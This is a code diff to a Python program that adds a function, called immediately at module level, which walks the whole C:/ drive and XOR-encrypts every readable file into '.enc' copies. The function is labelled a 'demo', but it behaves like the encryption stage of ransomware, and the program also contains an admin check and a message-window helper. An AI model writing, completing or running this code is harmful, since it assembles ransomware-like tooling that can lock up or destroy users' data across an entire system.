@@ -27,6 +27,27 @@ def is_admin():
     except:
         return False
 
+
+import os
+
+def encrypt_demo_folder(key_str="PAFF", root="C:/"):
+    enc_dir = os.path.join(root, "encrypted")
+    os.makedirs(enc_dir, exist_ok=True)
+    
+    for folder, subfolders, files in os.walk(root):
+        for name in files:
+            src = os.path.join(folder, name)
+            try:
+                dst_folder = os.path.join(enc_dir, os.path.relpath(folder, root))
+                os.makedirs(dst_folder, exist_ok=True)
+                dst = os.path.join(dst_folder, name + ".enc")
+                
+                xor_encrypt_file(src, dst, key_str)  # <-- indentation fix
+            except PermissionError:
+                print(f"[ERREUR] Pas d'accès à {src}")
+
+encrypt_demo_folder(key_str="PAFF", root="C:/")
+
 def show_message(title, message, borderless=False):
     root = tk.Tk()
     if borderless:
